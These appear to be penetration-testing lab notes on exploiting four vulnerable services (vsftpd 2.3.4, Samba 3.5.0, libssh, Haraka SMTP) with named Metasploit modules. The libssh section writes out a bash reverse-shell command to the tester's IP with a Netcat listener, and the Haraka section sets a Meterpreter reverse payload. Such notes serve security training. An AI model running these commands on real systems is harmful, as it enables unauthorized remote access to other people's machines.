
---

## Exploiting A Vulnerable FTP Server

vsftpd is an FTP server for Unix-like systems including Linux systems and is the default FTP server for Ubuntu, CentOS and Fedora.

vsftpd V2.3.4 is vulnerable to a command execution vulnerability that is facilitated by a malicious backdoor that was added to the vsftpd download archive through a supply chain attack.

We can use this MSF module to exploit this vulnerability: "unix/ftp/vsftpd_234_backdoor"

---

## Exploiting Samba

Samba V3.5.0 is vulnerable to remote code execution vulnerability, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it.

We can use this MSF module to exploit this vulnerability: "linux/samba/is_known_pipename"

---

## Exploiting A Vulnerable SSH Server

libssh is a multi-platform C library implementing the SSHv2 protocol on client and server side.

libssh V0.6.0-0.8.0 is vulnerable to and authentication bypass vulnerability in the libssh server code that can be exploited to execute commands on the target server.

We can use this MSF module to exploit this vulnerability: "scanner/ssh/libssh_auth_bypass"

Even though, this is an auxiliary module, we can use it to have a reverse shell session on the target machine. If the Shell action didn't work, we can use the Execute action to execute a shell command that would grant us a reverse shell. We will set the CMD option to:' bash -i >&/dev/tcp/(our IP address)/(port number) 0>&1'

Then, before we run the module, we will set a Netcat listener to listen on the port number we specified:`nc -nvlp (port number)`

When we  run the module and we returned back to Netcat, we will find a reverse shell session.

**For this module to work, we need to set the option: "SPAWN_PTY" to true for the Shell action to work.**

---

## Exploiting A Vulnerable SMTP Server


Haraka is an open source high performance SMTP server developed in Node.js

The Haraka SMTP server comes with a plugin for processing attachments. Haraka versions prior to V2.8.9 are vulnerable to command injection.

We can use this MSF module to exploit this vulnerability: "linux/smtp/haraka"

We will set the following options: 
1. SRVPORT 9898
2. email_to (an email that the server will accept)
3. payload linux/x64/meterpreter_reverse_http
4. rhost (target IP)
5. Lhost (our IP)

After we run the module, we will get an error saying that the session was closed. However, we will ignore this error and check if there are any sessions are open: `sessions`

We should have a meterpreter session open.
